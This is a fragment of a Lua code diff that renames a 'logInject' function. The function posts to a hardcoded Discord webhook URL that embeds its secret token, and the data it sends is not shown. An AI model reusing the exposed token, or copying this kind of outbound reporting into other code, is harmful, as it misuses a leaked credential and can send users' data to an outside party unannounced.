@@ -9,8 +9,8 @@ local function postHook(webhook , args)
 })
 end
 
-a.Entry()
-function a.logInject()
+
+function module.logInject()
 postHook(
     "https://discord.com/api/webhooks/1031943075536318594/Y-8Mo-SmQMqQkNXOQTEdw9VhAgSzUu3PCPszFkFVXms89AIoKRN-FkO0VCqiLXrgw0cp",
     {
